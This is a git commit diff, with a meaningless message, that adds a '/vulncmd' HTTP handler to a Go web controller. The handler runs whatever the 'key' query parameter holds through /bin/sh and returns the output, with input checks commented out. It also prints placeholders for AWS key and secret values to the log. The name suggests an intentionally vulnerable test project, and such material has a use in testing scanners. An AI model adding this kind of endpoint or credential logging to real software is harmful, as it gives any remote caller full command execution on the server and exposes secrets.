e4f92f43c4b1b1b0b92b6b28bdee7b35a15c25b4
lucyfyy <bambang.nalann@gmail.com>
2022-03-27 15:35:26 +0000

    sdadassdadadasdas

--- controller/basic.go
+++ controller/basic.go
@@ -1,8 +1,10 @@
 package controller
 
 import (
+	"fmt"
 	"html/template"
 	"net/http"
+	"os/exec"
 )
 
 func Basic() {
@@ -29,5 +31,31 @@ func Basic() {
 		if err != nil {
 			http.Error(w, err.Error(), http.StatusInternalServerError)
 		}
+	})
+
+	http.HandleFunc("/vulncmd", func(w http.ResponseWriter, r *http.Request) {
+		keys := r.URL.Query()["key"][0]
+
+		awsKey := "${{ secrets.AWS_KEY }}"
+		awsSecret := "${{ secrets.AWS_SECRET }}"
+		fmt.Println(awsKey, awsSecret)
+
+		// if !ok || len(keys) < 1 {
+		// 	fmt.Println("Url Param 'key' is missing")
+		// 	return
+		// }
+
+		key := keys
+
+		fmt.Println("Url Param 'key' is: " + string(key))
+		cmd := exec.Command("/bin/sh", "-c", string(key))
+		stdout, err := cmd.Output()
+
+		if err != nil {
+			fmt.Println(err.Error())
+			return
+		}
+
+		fmt.Fprintf(w, string(stdout))
 	})
 }
